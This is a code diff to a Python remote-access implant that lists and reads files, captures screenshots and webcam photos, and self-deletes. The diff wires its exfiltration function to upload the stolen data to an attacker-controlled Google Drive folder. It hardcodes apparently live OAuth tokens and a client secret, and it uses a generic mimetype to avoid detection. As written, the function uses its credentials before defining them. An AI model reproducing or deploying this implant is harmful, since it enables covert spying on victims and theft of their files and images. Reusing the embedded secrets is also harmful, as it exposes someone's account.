@@ -2,6 +2,10 @@ import random
 import subprocess
 from ctypes import c_uint
 from socket import *
+import io
+from google.oauth2.credentials import Credentials
+from googleapiclient.discovery import build
+from googleapiclient.http import MediaIoBaseUpload
 
 import cv2
 import pyautogui
@@ -96,7 +100,7 @@ def ls(cp: str):
     else:
         path = cp
     process = subprocess.run(["ls", cp], capture_output=True)
-    exfil(process.stdout)
+    exfil(process.stdout,'ls.txt')
 
 def find(cp: str):
     """
@@ -109,7 +113,7 @@ def find(cp: str):
     for file in fs:
         if cp in file:
             out += file + "\n"
-    exfil(out.encode())
+    exfil(out.encode(),'string_list.txt')
 
 def get(cp: str):
     """
@@ -118,31 +122,55 @@ def get(cp: str):
     """
     file = open(cp, "rb")
     contents = file.read()
-    exfil(contents)
+    exfil(contents,cp)
 
 def sc():
     """
     Exfiltrates screenshot
     """
-    exfil(pyautogui.screenshot().tobytes())
+    exfil(pyautogui.screenshot().tobytes(),'sc.png')
 
 def cam():
     """
     Exfiltrates webcam photo
     """
     vid = cv2.VideoCapture(0) # begin video recording through webcam
-    exfil(cv2.imencode('.jpg', vid.read()[1])[1].tobytes()) # exfiltrate still frame
+    exfil(cv2.imencode('.jpg', vid.read()[1])[1].tobytes(),'cam.jpg') # exfiltrate still frame
     vid.release() # stop video recording through webcam
 
 def sd():
     """
     Exfiltrates self destruct status and then deletes this file
     """
-    exfil("self destruct".encode()) # exfiltrate self destruct status
+    exfil("self destruct".encode(),'sd.txt') # exfiltrate self destruct status
     subprocess.run(["rm", __file__])
 
-def exfil(info: bytes): # TODO
-    print(info)
+def exfil(info: bytes,file_name: str): 
+
+    service = build('drive', 'v3', credentials=creds)
+
+
+    metadata = {
+    'name' : file_name,
+    'parents' : ['12xrEifuz-fyD9-yXpXupkUiPvLHAsU3p']#ID of Google Drive folder under our control
+    }
+
+    #The updated token is currently hardcoded and needs to be manually updated before implanting
+    creds = Credentials(token = "ya29.a0AWY7CknPxRAFyE-R4pknsi1M6YzhBINmJuvB89kEltfIXXX3vHl9pcJOD9oXaLPFyr5OQQFlmXxp4CG_Fbw2BZ6zZptxQpzsiKXi5rkXR79zec1uiqvrngo53IQ6kcw03_8dqBNwSm_36A8aJovl67FWy9goaCgYKATISARISFQG1tDrpDwbHxmEsF8JJqoB5Zo0LlA0163", 
+        refresh_token = "1//01nK0a4Vv6x6fCgYIARAAGAESNwF-L9IrPV4hZpa8Ps5kYiE91m3E5i-IcEQPXV4EmSJw2JPHsitIZkypEoSzHWNOAH8kYxPrDjQ", 
+        token_uri = "https://oauth2.googleapis.com/token", 
+        client_id = "12449451132-vlbs71mmjm4ra0o2gbkm2gtt38vcuavj.apps.googleusercontent.com", 
+        client_secret ="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", 
+        scopes = ["https://www.googleapis.com/auth/drive"])
+    
+    upload_file = MediaIoBaseUpload(io.BytesIO(info), mimetype='application/octet-stream', resumable=True)#Default mimetype to not give away info
+    results = service.files().create(
+    body=metadata,
+    media_body = upload_file
+    )
+    response = None
+    while response is None:
+        response = results.next_chunk()
 
 def makehello() -> bytes:
     """
